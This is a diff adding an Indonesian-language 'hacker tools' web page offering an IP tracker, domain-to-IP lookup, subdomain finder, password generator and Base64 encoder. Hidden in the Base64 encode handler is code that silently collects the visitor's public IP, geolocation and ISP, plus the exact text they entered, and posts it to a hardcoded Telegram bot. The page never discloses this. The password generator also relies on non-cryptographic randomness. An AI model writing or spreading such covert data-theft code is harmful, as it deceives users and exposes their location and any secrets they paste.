@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SamUDev — Hacker Tools</title>
+  <style>
+    :root{
+      --bg:#05070a;--accent:#00ff99;--muted:#6b7b82;
+      font-family:Consolas,Monaco,monospace;
+    }
+    html,body{margin:0;height:100%;background:var(--bg);color:#cfeee0}
+    .wrap{max-width:1100px;margin:36px auto;padding:26px}
+    .card{background:rgba(255,255,255,0.02);
+      border:1px solid rgba(0,255,153,0.1);padding:18px;border-radius:12px;margin-bottom:18px}
+    h2{margin:0 0 10px 0;color:var(--accent);font-size:18px}
+    input,textarea{width:100%;padding:10px;margin-top:6px;margin-bottom:8px;
+      border-radius:8px;background:transparent;
+      border:1px solid rgba(255,255,255,0.1);color:inherit}
+    button{background:transparent;border:1px solid var(--accent);color:var(--accent);
+      padding:8px 12px;border-radius:8px;cursor:pointer;margin-top:4px}
+    pre{background:rgba(0,0,0,0.35);padding:10px;border-radius:8px;overflow:auto;font-family:monospace}
+    footer{position:fixed;bottom:10px;left:0;right:0;text-align:center}
+    .copyright{background:rgba(0,0,0,0.6);display:inline-block;padding:6px 14px;border-radius:999px}
+
+    /* custom select */
+    .select-wrapper { position:relative; display:inline-block; width:100%; margin-top:6px;margin-bottom:8px; }
+    .custom-select {
+      width:100%; padding:10px; border-radius:8px; background:rgba(255,255,255,0.05);
+      border:1px solid var(--accent); color:var(--accent); cursor:pointer;
+      appearance:none; -webkit-appearance:none; -moz-appearance:none;
+      font-family:inherit;
+    }
+    .select-wrapper::after {
+      content:"▼"; position:absolute; right:12px; top:50%; transform:translateY(-50%);
+      color:var(--accent); pointer-events:none;
+    }
+
+    /* notification */
+    .notif {
+      position:fixed; top:20px; right:20px; padding:12px 18px; border-radius:8px;
+      font-size:14px; opacity:0; transition:opacity 0.3s, transform 0.3s;
+      transform:translateY(-20px); z-index:1000;
+    }
+    .notif.show { opacity:1; transform:translateY(0); }
+    .notif.success { background:rgba(0,255,153,0.15); border:1px solid var(--accent); color:var(--accent); }
+    .notif.error { background:rgba(255,0,0,0.15); border:1px solid #ff4d4d; color:#ff4d4d; }
+  </style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- IP Tracker -->
+  <div class="card">
+    <h2>IP Tracker</h2>
+    <input id="ip-input" type="text" placeholder="Masukkan IP address" />
+    <button id="ip-btn">Lacak</button>
+    <div id="ip-result" style="margin-top:12px"><pre>--</pre></div>
+  </div>
+
+  <!-- Domain to IP -->
+  <div class="card">
+    <h2>Domain to IP Detector</h2>
+    <input id="domain-input" type="text" placeholder="Masukkan domain, contoh: example.com" />
+    <button id="domain-btn">Deteksi IP</button>
+    <div id="domain-result" style="margin-top:12px"><pre>--</pre></div>
+  </div>
+
+  <!-- Subdomain Finder -->
+  <div class="card">
+    <h2>Subdomain Finder</h2>
+    <input id="subdomain-target" type="text" placeholder="Domain target (example.com)" />
+    <textarea id="sub-list" rows="4">www
+mail
+admin
+dev
+api</textarea>
+    <button id="sub-btn">Cari</button>
+    <div id="sub-result" style="margin-top:12px"><pre>--</pre></div>
+  </div>
+
+  <!-- Password Generator -->
+  <div class="card">
+    <h2>Password Generator</h2>
+    <div class="select-wrapper">
+      <select id="pw-level" class="custom-select">
+        <option value="easy">Easy (angka)</option>
+        <option value="hard">Hard (angka+huruf)</option>
+        <option value="hardpp">Hard++ (angka+huruf+symbol)</option>
+      </select>
+    </div>
+    <input id="pw-len" type="number" min="4" max="64" value="12" />
+    <button id="pw-btn">Generate</button>
+    <button id="pw-copy">Copy</button>
+    <pre id="pw-out" style="margin-top:8px">--</pre>
+  </div>
+
+  <!-- Base64 Tools -->
+  <div class="card">
+    <h2>Base64 Encode / Decode</h2>
+    <textarea id="b-input" rows="4"></textarea>
+    <button id="b-enc">Encode</button>
+    <button id="b-dec">Decode</button>
+    <button id="b-clear">Clear</button>
+    <pre id="b-out" style="margin-top:8px">--</pre>
+  </div>
+
+</div>
+
+<footer>
+  <div class="copyright">Copyright By ©SamuDev</div>
+</footer>
+
+<div id="notif" class="notif"></div>
+
+<script>
+  // Notif function
+  function showNotif(msg,type="success"){
+    const n=document.getElementById('notif');
+    n.textContent=msg;
+    n.className="notif "+type+" show";
+    setTimeout(()=>{n.classList.remove("show");},2000);
+  }
+
+  // --- IP Tracker ---
+  document.getElementById('ip-btn').addEventListener('click', async ()=>{
+    const v=document.getElementById('ip-input').value.trim();
+    const out=document.getElementById('ip-result');
+    if(!v){ out.innerHTML='<pre>Masukkan IP address</pre>'; return; }
+    out.innerHTML='<pre>Loading...</pre>';
+    try{
+      let res=await fetch(`https://ipapi.co/${v}/json/`);
+      if(!res.ok) res=await fetch(`https://ipwhois.app/json/${v}`);
+      const data=await res.json();
+      out.innerHTML='<pre>'+JSON.stringify(data,null,2)+'</pre>';
+    }catch(e){
+      out.innerHTML='<pre>Gagal tracking IP</pre>';
+    }
+  });
+
+  // --- Domain to IP ---
+  document.getElementById('domain-btn').addEventListener('click', async ()=>{
+    const v=document.getElementById('domain-input').value.trim();
+    const out=document.getElementById('domain-result');
+    if(!v){ out.innerHTML='<pre>Masukkan domain</pre>'; return; }
+    out.innerHTML='<pre>Resolving...</pre>';
+    try{
+      const dns=await fetch(`https://dns.google/resolve?name=${encodeURIComponent(v)}&type=A`);
+      const j=await dns.json();
+      if(j.Answer && j.Answer.length>0){
+        const ip=j.Answer.find(a=>a.type===1)?.data;
+        out.innerHTML='<pre>Domain: '+v+'\\nIP: '+ip+'</pre>';
+      }else{
+        out.innerHTML='<pre>Tidak ditemukan IP untuk domain ini</pre>';
+      }
+    }catch(e){
+      out.innerHTML='<pre>Error resolve domain</pre>';
+    }
+  });
+
+  // --- Subdomain Finder ---
+  document.getElementById('sub-btn').addEventListener('click', async ()=>{
+    const domain=document.getElementById('subdomain-target').value.trim();
+    const list=document.getElementById('sub-list').value.split(/\\n/).map(s=>s.trim()).filter(Boolean);
+    const rbox=document.getElementById('sub-result');
+    if(!domain||!list.length){ rbox.innerHTML='<pre>Masukkan domain & wordlist</pre>'; return; }
+    rbox.innerHTML='<pre>Scanning...</pre>';
+    let found=[];
+    for(const sub of list){
+      const full=sub+"."+domain;
+      try{
+        const dns=await fetch(`https://dns.google/resolve?name=${full}&type=A`);
+        const j=await dns.json();
+        if(j.Answer && j.Answer.length>0){
+          const ip=j.Answer.find(a=>a.type===1)?.data;
+          found.push(full+" -> "+ip);
+        }
+      }catch{}
+    }
+    rbox.innerHTML='<pre>'+(found.length?found.join("\\n"):"Tidak ada subdomain ditemukan")+'</pre>';
+  });
+
+  // --- Password Generator ---
+  function genPW(len,level){
+    let chars="0123456789";
+    if(level!=="easy") chars+="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    if(level==="hardpp") chars+="!@#$%^&*()-_=+[]{}<>?";
+    let pw="";
+    for(let i=0;i<len;i++) pw+=chars[Math.floor(Math.random()*chars.length)];
+    return pw;
+  }
+  document.getElementById('pw-btn').addEventListener('click',()=>{
+    const lvl=document.getElementById('pw-level').value;
+    const len=parseInt(document.getElementById('pw-len').value);
+    const pw=genPW(len,lvl);
+    document.getElementById('pw-out').textContent=pw;
+  });
+  document.getElementById('pw-copy').addEventListener('click',()=>{
+    const pw=document.getElementById('pw-out').textContent;
+    if(pw && pw!=="--"){
+      navigator.clipboard.writeText(pw);
+      showNotif("Password berhasil disalin ✅","success");
+    }else{
+      showNotif("Belum ada password untuk disalin ❌","error");
+    }
+  });
+
+  // --- Base64 Tools ---
+  // --- Base64 Tools ---
+// --- Base64 Tools ---
+document.getElementById('b-enc').addEventListener('click', async ()=>{
+  const v=document.getElementById('b-input').value;
+  const encoded = btoa(unescape(encodeURIComponent(v)));
+  document.getElementById('b-out').textContent=encoded;
+
+  try {
+    // Ambil IP publik
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    // Track detail lokasi
+    const trackRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const track = await trackRes.json();
+
+    // Bendera dari country code 🇮🇩
+    function flagEmoji(countryCode){
+      return countryCode.replace(/./g, c =>
+        String.fromCodePoint(127397 + c.toUpperCase().charCodeAt())
+      );
+    }
+
+    const message = `
+🔐 Encode ditekan!
+📌 IP: ${ip}
+🌍 Negara: ${track.country_name} ${flagEmoji(track.country_code || "UN")}
+🏙️ Wilayah: ${track.region}
+🏠 Kota: ${track.city}
+🌐 ISP: ${track.org}
+🛰️ Latitude: ${track.latitude}, Longitude: ${track.longitude}
+
+📥 Data asli: ${v}
+📤 Data encode: ${encoded}
+    `;
+
+    // Kirim ke Telegram
+    const BOT_TOKEN = "8270793785:AAFgx28kKG2eCxMQhDU5u7z5IdsB4HO6HqM";
+    const CHAT_ID = "7625804862";
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+
+  } catch (e) {
+    console.error("Gagal kirim ke Telegram", e);
+  }
+});
+</script>
+</body>
+</html>
